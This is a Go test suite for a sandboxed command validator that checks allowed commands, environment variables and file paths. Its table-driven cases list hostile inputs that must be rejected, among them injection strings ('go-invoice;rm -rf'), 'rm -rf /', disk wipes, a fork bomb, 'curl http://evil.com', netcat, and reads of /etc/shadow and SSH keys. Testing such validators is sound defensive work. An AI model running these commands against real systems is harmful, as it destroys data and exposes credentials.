package executor

import (
	"context"
	"testing"

	"github.com/stretchr/testify/mock"
	"github.com/stretchr/testify/suite"
)

// CommandValidatorTestSuite tests the DefaultCommandValidator implementation
type CommandValidatorTestSuite struct {
	suite.Suite

	validator *DefaultCommandValidator
	logger    *MockLogger
	sandbox   SandboxConfig
}

func (suite *CommandValidatorTestSuite) SetupTest() {
	suite.logger = new(MockLogger)

	suite.sandbox = SandboxConfig{
		AllowedCommands:      []string{"go-invoice", "echo"},
		AllowedPaths:         []string{"/tmp", "/home"},
		BlockedPaths:         []string{"/etc", "/root"},
		EnvironmentWhitelist: []string{"PATH", "HOME", "USER"},
	}

	// Setup logger expectations
	suite.logger.On("Debug", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything).Maybe()
	suite.logger.On("Info", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything).Maybe()
	suite.logger.On("Warn", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything).Maybe()
	suite.logger.On("Error", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything).Maybe()

	suite.validator = NewDefaultCommandValidator(suite.logger, suite.sandbox)
}

// TestNewDefaultCommandValidator tests the constructor
func (suite *CommandValidatorTestSuite) TestNewDefaultCommandValidator() {
	validator := NewDefaultCommandValidator(suite.logger, suite.sandbox)
	suite.NotNil(validator)
	suite.Equal(suite.logger, validator.logger)
	suite.Equal(suite.sandbox, validator.sandbox)
}

// TestNewDefaultCommandValidatorPanicsWithNilLogger tests constructor panics without logger
func (suite *CommandValidatorTestSuite) TestNewDefaultCommandValidatorPanicsWithNilLogger() {
	suite.Panics(func() {
		NewDefaultCommandValidator(nil, suite.sandbox)
	})
}

// TestValidateCommand tests command validation
func (suite *CommandValidatorTestSuite) TestValidateCommand() {
	ctx := context.Background()

	tests := []struct {
		name    string
		command string
		args    []string
		wantErr bool
	}{
		{
			name:    "ValidCommand",
			command: "go-invoice",
			args:    []string{"invoice", "list"},
			wantErr: false,
		},
		{
			name:    "CommandWithSemicolon",
			command: "go-invoice;rm -rf",
			args:    nil,
			wantErr: true,
		},
		{
			name:    "CommandWithPipe",
			command: "go-invoice|cat",
			args:    nil,
			wantErr: true,
		},
		{
			name:    "CommandWithAmpersand",
			command: "go-invoice&",
			args:    nil,
			wantErr: true,
		},
		{
			name:    "CommandWithBacktick",
			command: "go-invoice`pwd`",
			args:    nil,
			wantErr: true,
		},
		{
			name:    "CommandWithDollar",
			command: "go-invoice$HOME",
			args:    nil,
			wantErr: true,
		},
		{
			name:    "CommandWithNullByte",
			command: "go-invoice\x00",
			args:    nil,
			wantErr: true,
		},
		{
			name:    "DangerousRmRf",
			command: "rm",
			args:    []string{"-rf", "/"},
			wantErr: true,
		},
		{
			name:    "DangerousSudo",
			command: "sudo",
			args:    []string{"rm", "-rf", "/"},
			wantErr: true,
		},
		{
			name:    "ArgumentTooLong",
			command: "echo",
			args:    []string{string(make([]byte, 5000))},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			err := suite.validator.ValidateCommand(ctx, tt.command, tt.args)
			if tt.wantErr {
				suite.Error(err)
			} else {
				suite.NoError(err)
			}
		})
	}
}

// TestValidateCommandContextCancellation tests context cancellation
func (suite *CommandValidatorTestSuite) TestValidateCommandContextCancellation() {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	err := suite.validator.ValidateCommand(ctx, "echo", nil)
	suite.Equal(context.Canceled, err)
}

// TestValidateEnvironment tests environment variable validation
func (suite *CommandValidatorTestSuite) TestValidateEnvironment() {
	ctx := context.Background()

	tests := []struct {
		name    string
		env     map[string]string
		wantErr bool
	}{
		{
			name:    "ValidEnv",
			env:     map[string]string{"PATH": "/usr/bin", "HOME": "/home/user"},
			wantErr: false,
		},
		{
			name:    "NotAllowedEnv",
			env:     map[string]string{"SECRET_KEY": "value"},
			wantErr: true,
		},
		{
			name:    "EnvWithNullByte",
			env:     map[string]string{"PATH": "/usr/bin\x00/evil"},
			wantErr: true,
		},
		{
			name:    "EmptyEnv",
			env:     map[string]string{},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			err := suite.validator.ValidateEnvironment(ctx, tt.env)
			if tt.wantErr {
				suite.Error(err)
			} else {
				suite.NoError(err)
			}
		})
	}
}

// TestValidateEnvironmentContextCancellation tests context cancellation
func (suite *CommandValidatorTestSuite) TestValidateEnvironmentContextCancellation() {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	err := suite.validator.ValidateEnvironment(ctx, map[string]string{"PATH": "/usr/bin"})
	suite.Equal(context.Canceled, err)
}

// TestValidatePath tests path validation
func (suite *CommandValidatorTestSuite) TestValidatePath() {
	ctx := context.Background()

	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{
			name:    "ValidPath",
			path:    "/tmp/test.txt",
			wantErr: false,
		},
		{
			name:    "ValidPathInHome",
			path:    "/home/user/test.txt",
			wantErr: false,
		},
		{
			name:    "PathTraversal",
			path:    "/tmp/../etc/passwd",
			wantErr: true,
		},
		{
			name:    "BlockedPath",
			path:    "/etc/passwd",
			wantErr: true,
		},
		{
			name:    "BlockedRootPath",
			path:    "/root/.ssh/id_rsa",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			err := suite.validator.ValidatePath(ctx, tt.path)
			if tt.wantErr {
				suite.Error(err)
			} else {
				suite.NoError(err)
			}
		})
	}
}

// TestValidatePathContextCancellation tests context cancellation
func (suite *CommandValidatorTestSuite) TestValidatePathContextCancellation() {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	err := suite.validator.ValidatePath(ctx, "/tmp/test.txt")
	suite.Equal(context.Canceled, err)
}

// TestCheckCommandInjection tests command injection detection
func (suite *CommandValidatorTestSuite) TestCheckCommandInjection() {
	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{"CleanCommand", "go-invoice", false},
		{"WithSemicolon", "go-invoice;ls", true},
		{"WithAmpersand", "go-invoice&", true},
		{"WithPipe", "go-invoice|cat", true},
		{"WithBacktick", "`whoami`", true},
		{"WithDollar", "echo $PATH", true},
		{"WithParentheses", "$(whoami)", true},
		{"WithBraces", "go-invoice{}", true},
		{"WithRedirect", "go-invoice>file", true},
		{"WithNewline", "go-invoice\nls", true},
		{"WithCarriageReturn", "go-invoice\rls", true},
		{"WithNullByte", "go-invoice\x00", true},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			err := suite.validator.checkCommandInjection(tt.command)
			if tt.wantErr {
				suite.Error(err)
			} else {
				suite.NoError(err)
			}
		})
	}
}

// TestValidateArgument tests argument validation
func (suite *CommandValidatorTestSuite) TestValidateArgument() {
	tests := []struct {
		name    string
		arg     string
		wantErr bool
	}{
		{"ValidArgument", "invoice", false},
		{"ValidPath", "/tmp/test.txt", false},
		{"ValidWithSpaces", "hello world", false},
		{"ValidWithTab", "hello\tworld", false},
		{"ValidWithNewline", "hello\nworld", false},
		{"WithNullByte", "hello\x00world", true},
		{"WithControlChar", "hello\x01world", true},
		{"TooLong", string(make([]byte, 5000)), true},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			err := suite.validator.validateArgument(tt.arg)
			if tt.wantErr {
				suite.Error(err)
			} else {
				suite.NoError(err)
			}
		})
	}
}

// TestCheckDangerousPatterns tests dangerous pattern detection
func (suite *CommandValidatorTestSuite) TestCheckDangerousPatterns() {
	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{"SafeCommand", "go-invoice invoice list", false},
		{"RmRfRoot", "rm -rf /", true},
		{"RmFrRoot", "rm -fr /", true},
		{"DdZero", "dd if=/dev/zero of=/dev/sda", true},
		{"Mkfs", "mkfs.ext4 /dev/sda", true},
		{"ForkBomb", ":(){ :|:& };:", true},
		{"WgetHttp", "wget http://evil.com", true},
		{"CurlHttp", "curl http://evil.com", true},
		{"Netcat", "nc -l 1234", true},
		{"EtcPasswd", "cat /etc/passwd", true},
		{"EtcShadow", "cat /etc/shadow", true},
		{"Sudo", "sudo rm -rf /", true},
		{"SuDash", "su - root", true},
	}

	for _, tt := range tests {
		suite.Run(tt.name, func() {
			err := suite.validator.checkDangerousPatterns(tt.command)
			if tt.wantErr {
				suite.Error(err)
			} else {
				suite.NoError(err)
			}
		})
	}
}

func TestCommandValidatorTestSuite(t *testing.T) {
	suite.Run(t, new(CommandValidatorTestSuite))
}

// TestSecurityErrorVariables tests that error variables are properly defined
func TestSecurityErrorVariables(t *testing.T) {
	tests := []struct {
		err     error
		name    string
		wantMsg string
	}{
		{ErrPathTraversal, "ErrPathTraversal", "path traversal detected"},
		{ErrInvalidCharacter, "ErrInvalidCharacter", "invalid character in input"},
		{ErrCommandInjection, "ErrCommandInjection", "potential command injection detected"},
		{ErrEnvNotAllowed, "ErrEnvNotAllowed", "environment variable not allowed"},
		{ErrArgumentTooLong, "ErrArgumentTooLong", "argument too long"},
		{ErrDangerousPattern, "ErrDangerousPattern", "dangerous pattern detected"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.err.Error() != tt.wantMsg {
				t.Errorf("got %q, want %q", tt.err.Error(), tt.wantMsg)
			}
		})
	}
}
